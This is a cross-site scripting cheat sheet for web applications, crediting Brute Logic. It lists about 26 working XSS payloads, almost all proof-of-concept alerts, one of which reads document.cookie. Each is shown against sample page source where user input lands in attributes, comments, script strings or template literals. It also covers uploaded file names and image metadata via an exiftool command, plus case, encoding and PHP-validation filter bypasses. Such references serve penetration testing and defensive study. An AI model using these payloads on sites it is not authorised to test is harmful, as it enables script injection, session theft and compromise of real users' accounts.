# XSS Cheat Sheet (Basic)

## **Introduction**
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There is 3 types of XSS Attack:
- Reflected XSS

    Attack where the malicious script runs from another website through the web browser    
- Stored XSS
  
    Stored attacks are those where the injected script is permanently stored on the target servers
- DOM-Based XSS

    A type of XSS that has payloads found in the DOM rather than within the HTML code.

## **Payloads**
1. Basic payload
```html
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

2. Add ' or " to escape the payload from value of an HTML tag
```html
"><script>alert(1)</script>
'><script>alert(1)</script> 
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* After input the payload
```html
<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
```

3. Add --> to escape the payload if input lands in HTML comments.
```html
--><script>alert(1)</script>
```

* Example source code
```html
<!-- REFLECTED_HERE --> 
```

* After input the payload
```html
<!-- --><script>alert(1)</script> -->
```

4. Add </tag> when the input inside or between opening/closing tags, tag can be ```<a>,<title>,<script>``` and any other HTML tags
    
```html
</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>
```

* Example source code
```html
<a href="https://target.com/1?status=REFLECTED_HERE">1</a>
```

* After input the payload
```html
<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
```

5. Use when input inside an attribute’s value of an HTML tag but > is filtered
```html
" onmouseover=alert(1)
" autofocus onfocus=alert(1)
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* After input the payload
```html
<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
```

6. Use </script> when input inside ```<script>``` tags
```html
</script><script>alert(1)</script>
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var sitekey = '</script><script>alert(1)</script>';
</script>
```

## **XSS Cheat Sheet (Advanced)**
7. Use when input lands in a script block, inside a string delimited value.
```html
'-alert(1)-'
'/alert(1)//
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var sitekey = ''-alert(1)-'';
</script>
```

8. Same like Number 7. But inside a string delimited value but quotes are escaped by a backslash.
```html
\'alert(1)//
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* If we input payload '-alert(1)-' it will be like this
```html
<script>
    var sitekey = '\'-alert(1)-\'';
</script>
```
The quotes are escaped by a backslash so we need to bypass them

* After input the payload
```html
<script>
    var sitekey = '\\'alert(1)//';
</script>
```

9. Use when there’s multi reflection in the same line of JS code
```html
/alert(1)//\
/alert(1)}//\
```

* Example source code
```html
<script>
    var a = 'REFLECTED_HERE'; var b = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var a = '/alert(1)//\'; var b = '/alert(1)//\';
</script>
```

10. Use when input inside a string delimited value and inside a single logical block like function or conditional (if, else, etc).
```html
'}alert(1);{'
\'}alert(1);{// 
```

* Example source code
```html
<script>
    var greeting;
    var time = 1;
    if (time < 10) {
    test = 'REFLECTED_HERE';
  }
</script>
```

* After input the payload
```html
<script>
    var test;
    var time = 1;
    if (time < 10) {
    test = ''}alert(1);{'';
  }
</script>
```

> Payload number 2 uses when quote escaped by backslash

11. Use when input lands inside backticks delimited strings
```html
${alert(1)}
```

* Example source code
```html
<script>
    var dapos = `REFLECTED_HERE`;
</script>
```

* After input the payload
```html
<script>
    var dapos = `${alert(1)}`;
</script>
```

12. Uses when there is multiple reflections on same page. (Double Reflection)
```html
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
```

* After input the payload
```html
<!DOCTYPE html>
<html>
<body>
'onload=alert(1)><svg/1='
[...]
'onload=alert(1)><svg/1='
</body>
</html>
```

13. Uses when there is multiple reflections on same page. (Triple Reflection)
```html
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
```

* After input the payload
```html
<!DOCTYPE html>
<html>
<body>
*/alert(1)">'onload="/*<svg/1='
[...]
*/alert(1)">'onload="/*<svg/1='
[...]
*/alert(1)">'onload="/*<svg/1='
</body>
</html>
```

14. XSS in filename (File Upload) Use when uploaded filename is reflected somewhere in target page
```
"><svg onload=alert(1)>.jpeg
```

15. XSS in metadata (File Upload) Use when uploaded metada is reflected somewhere in target page (using exiftool)
```
$ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
```

16. XSS with SVG file (File Upload)
```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

17. XSS via markdown
```
[Click Me](javascript:alert('1'))
```

18. XSS in XML page
```
<a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
```
> Add a "-->" to payload if input lands in a comment section

> Add a "]]>" if input lands in a CDATA section

## **XSS Cheat Sheet (Bypass)**
19. Mixed Case
```html
<Script>alert(document.cookie)</Script> 
```

20. Unclosed Tags
```html
<svg onload="alert(1)"
```

21. Uppercase Payloads
```html
<SVG ONLOAD=ALERT(1)>
```

22. Encoded XSS
```html
(Encoded)
%3Csvg%20onload%3Dalert(1)%3E 

(Double Encoded)
%253Csvg%2520onload%253Dalert%281%29%253E 

(Triple Encoded)
%25253Csvg%252520onload%25253Dalert%25281%2529%25253E 
```

23. JS Lowercased Input
```html
<SCRİPT>alert(1)</SCRİPT>
```

24. PHP Email Validation Bypass
```html
<svg/onload=alert(1)>"@gmail.com
```

25. PHP URL Validation Bypass
```html
javascript://%250Aalert(1)
```

26. Inside Comments Bypass
```html
<!--><svg onload=alert(1)-->
```

Reference:
- [Brute Logic](https://brutelogic.com.br/)